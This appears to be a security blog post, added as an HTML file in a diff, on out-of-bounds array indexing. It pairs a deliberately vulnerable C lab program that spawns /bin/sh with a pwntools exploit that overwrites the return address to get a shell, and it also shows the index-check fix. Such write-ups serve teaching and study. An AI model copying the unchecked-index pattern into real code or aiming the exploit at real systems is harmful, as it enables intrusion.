@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Out Of Bounds · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ Out of Bounds occurs when a negative number or a value outside the size of the array is entered as an array index value. This can be prevented by simply inserting the verification process code for the index during development. if (idx = 128) { printf(&quot;Invalid index!\">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-out-of-bounds/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-out-of-bounds/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-out-of-bounds/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Out Of Bounds · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ Out of Bounds occurs when a negative number or a value outside the size of the array is entered as an array index value. This can be prevented by simply inserting the verification process code for the index during development. if (idx = 128) { printf(&quot;Invalid index!\"><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-out-of-bounds/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Out Of Bounds","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ Out of Bounds occurs when a negative number or a value outside the size of the array is entered as an array index value. This can be prevented by simply inserting the verification process code for the index during development. if (idx = 128) { printf(\"Invalid index!\\","datePublished":"2024-06-24","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-out-of-bounds/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-out-of-bounds/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Out Of Bounds</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ Out of Bounds occurs when a negative number or a value outside the size of the array is entered as an array index value. This can be prevented by simply inserting the verification process code for the index during development. if (idx = 128) { printf(&quot;Invalid index!\</p><div class="article-meta"><time datetime="2024-06-24">Jun 24, 2024</time><span>·</span><span>1 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will make corrections after confirmation.</strong> <strong>※</strong> </p>
+<p>Out of Bounds occurs when a negative number or a value outside the size of the array is entered as an array index value.</p>
+<p>This can be prevented by simply inserting the verification process code for the index during development.</p>
+<pre><code>    if (idx &lt; 0 || idx &gt;= 128) {
+        printf(&quot;Invalid index!\n&quot;);
+        return;
+    }
+</code></pre>
+<p>Let’s take a look at the example below.</p>
+<pre><code>// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void gift() {
+	printf(&quot;Hello! ZZoMblE&quot;);
+	system(&quot;/bin/sh&quot;);
+}
+void initialize() {
+	setvbuf(stdin, NULL, _IONBF, 0);
+	setvbuf(stdout, NULL, _IONBF, 0);
+}
+void vuln() {
+	char buf[128];
+	int idx = 0;
+	printf(&quot;input idx : &quot;);
+	scanf(&quot;%d&quot;, &amp;idx);
+
+	printf(&quot;input change value : &quot;);
+	read(0, buf[idx],0x10);
+
+}
+int main() {
+	initialize();
+	vuln();
+	return 0;
+}
+</code></pre>
+<p>This time again, a vulnerability occurs in the input of vuln().</p>
+<p>Since the user can write as many values ​​as 0x10 at the desired index position, Return Address Overflow can be performed if only the index of ret is calculated.</p>
+<p><img src="/assets/images/tistory/tistory-58fe9a713fd6/001.png" alt=""></p>
+<p>0 is entered in idx.</p>
+<p>Since ret and buf are separated by 136, you can find out that overwriting is possible at the ret location by entering 136 in idx.</p>
+<p>I want to overwrite gift() in ret, but since the stack alignment is not correct in the current state, I write a ret gadget to match it.</p>
+<pre><code>from pwn import *
+
+target = b'./ex'
+
+p = process(target)
+e = ELF(target)
+
+gift = e.sym['gift']
+ret = 0x000000000040101a
+
+payload = p64(ret)
+payload += p64(gift)
+
+p.sendlineafter(b': ',b'136')
+p.sendafter(b':', payload)
+
+p.interactive()
+</code></pre>
+<p>If you run it, you can see that the shell has been obtained.</p>
+<p><img src="/assets/images/tistory/tistory-58fe9a713fd6/002.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-out-of-bounds/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
